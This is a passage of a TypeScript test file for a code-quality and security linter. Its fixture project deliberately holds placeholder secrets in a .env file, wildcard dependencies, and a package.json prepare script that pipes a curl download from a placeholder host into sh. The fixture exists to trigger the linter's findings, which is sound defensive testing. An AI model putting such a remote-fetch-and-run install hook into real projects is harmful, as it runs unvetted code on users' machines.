PRIVATE_KEY=${PRIVATE_KEY_HEADER_FIXTURE_VALUE}
DATABASE_URL=${POSTGRES_URL_FIXTURE_VALUE}
JWT_TOKEN=${JWT_FIXTURE_VALUE}
OPENAI_API_KEY=${OPENAI_KEY_FIXTURE_VALUE}
PATIENT_SSN=${SSN_FIXTURE_VALUE}
API_TOKEN=${API_TOKEN_FIXTURE_VALUE}
`,
      "package.json": JSON.stringify({
        scripts: {
          postinstall: "node scripts/setup.js",
          prepare: "curl https://example.test/install.sh | sh",
        },
        bin: {
          "missing-cli": "./bin/missing.js",
          "bad-cli": "./bin/bad.js",
        },
        dependencies: {
          "wide-open": "*",
          "remote-tool": "git+https://github.com/example/remote-tool.git",
        },
      }),
      "bin/bad.js": "#!/usr/bin/env node\nconsole.log('ok');\n",
      "tsconfig.json": JSON.stringify({
        compilerOptions: {
          strict: false,
          noUncheckedIndexedAccess: false,
          exactOptionalPropertyTypes: false,
        },
      }),
    },
    {
      config: {
        rules: {
          "complexity.cognitive": { thresholds: { warn: 3 } },
          "complexity.cyclomatic": { thresholds: { warn: 2, error: 50 } },
          "complexity.npath": { thresholds: { warn: 2, error: 100 } },
          "design.large-module-concentration": { thresholds: { minFiles: 4, minLines: 8, maxSharePercent: 35 } },
          "docs.todo-density": { thresholds: { markers: 1 } },
          "size.file-length": { thresholds: { warn: 8, error: 500 } },
          "size.function-length": { thresholds: { warn: 8, error: 500 } },
          "size.parameter-count": { thresholds: { warn: 3 } },
          "test-quality.setup-bloat": { thresholds: { maxSetupLines: 2 } },
        },
      },
    },
  );
  return new Set(report.findings.map((finding) => finding.ruleId));
}

function thresholdUsages(source: string): Map<string, string[]> {
  const usages = new Map<string, Set<string>>();
  for (const match of source.matchAll(/threshold\((?:[A-Za-z_$][A-Za-z0-9_$]*\.)?config,\s*"([^"]+)",\s*"([^"]+)"/g)) {
    const ruleId = match[1] ?? "";
    const key = match[2] ?? "";
    usages.set(ruleId, usages.get(ruleId) ?? new Set<string>());
    usages.get(ruleId)?.add(key);
  }
  return new Map([...usages.entries()].sort(([left], [right]) => left.localeCompare(right)).map(([ruleId, keys]) => [ruleId, [...keys].sort()]));
}

function yamlThresholdDefaults(source: string): Map<string, string[]> {
  const result = new Map<string, string[]>();
  let isInRules = false;
  let currentRule = "";
  let isInThresholds = false;
  for (const line of source.split(/\r?\n/)) {
    if (line.trim() === "rules:") {
      isInRules = true;
      continue;
    }
    if (!isInRules) {
      continue;
    }
    const ruleMatch = line.match(/^  ([a-z-]+\.[a-z0-9-]+):\s*$/);
    if (ruleMatch?.[1]) {
      currentRule = ruleMatch[1];
      isInThresholds = false;
      continue;
    }
    if (currentRule && line.match(/^    thresholds:\s*$/)) {
      isInThresholds = true;
      result.set(currentRule, []);
      continue;
    }
    const keyMatch = line.match(/^      ([A-Za-z0-9_-]+):/);
    if (currentRule && isInThresholds && keyMatch?.[1]) {
      result.get(currentRule)?.push(keyMatch[1]);
    }
  }
  return new Map([...result.entries()].sort(([left], [right]) => left.localeCompare(right)).map(([ruleId, keys]) => [ruleId, keys.sort()]));
}
